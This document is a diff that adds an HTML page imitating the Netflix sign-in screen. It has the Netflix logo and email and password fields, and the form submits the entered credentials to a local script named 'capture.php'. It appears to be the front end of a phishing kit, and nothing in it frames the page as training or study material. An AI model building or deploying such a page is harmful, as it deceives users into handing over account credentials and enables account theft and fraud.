@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <div class="background">
+        <div class="overlay"></div>
+        <div class="content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
+            <form class="login-form" action="./capture.php" method="post">
+                <h1>Sign In</h1>
+                <input type="text" placeholder="Email or mobile number" id="email" name="email" required>
+                <input type="password" placeholder="Password" id="password" name="password" required>
+                <button type="submit" class="btn-signin">Sign In</button>
+                <div class="options">
+                    <p>OR</p>
+                    <button type="button" class="btn-secondary">Use a sign-in code</button>
+                </div>
+                <div class="forgot-remember">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                    <label>
+                        <input type="checkbox" name="remember"> Remember me
+                    </label>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
